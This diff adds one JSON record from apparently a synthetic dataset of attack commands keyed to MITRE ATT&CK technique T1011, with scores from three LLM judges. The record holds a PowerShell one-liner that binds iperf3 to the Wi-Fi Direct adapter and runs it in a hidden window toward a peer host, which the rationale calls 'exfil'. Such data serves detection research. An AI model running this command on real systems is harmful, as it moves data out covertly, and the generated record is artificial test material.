@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
+  "explanation": "Uses the Wi‑Fi Direct virtual adapter and binds iperf3 to it, sending over a peer‑to‑peer Wi‑Fi Direct link rather than the primary network (T1011).",
+  "rationale_steps": [
+    "Identify the Wi‑Fi Direct virtual adapter used for P2P links.",
+    "Get the adapter's assigned IPv4 address.",
+    "Run iperf3 bound to this interface on a high port for exfil.",
+    "Hide the process window to lower casual visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce514a45",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid cmdlets/parameters, and proper statement separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Binding iperf3 to the Wi‑Fi Direct adapter IP should route traffic over that medium, but it relies on the exact adapter name/IP being present and a listening peer at 192.168.137.2.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:12:19.171861Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignments, error handling with -ErrorAction, and proper command chaining using semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by identifying a Wi-Fi Direct adapter, obtaining its IP address, and using iperf3 to exfiltrate data over this alternative network medium while hiding the process window.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:12:25.021846Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell cmdlet syntax, variable assignments, property access, and argument list formatting for Start-Process.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by explicitly identifying the Wi-Fi Direct adapter, binding iperf3 to its IP address, and initiating traffic over this alternative network medium, which is operationally plausible for exfiltration simulation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T00:12:36.587290Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
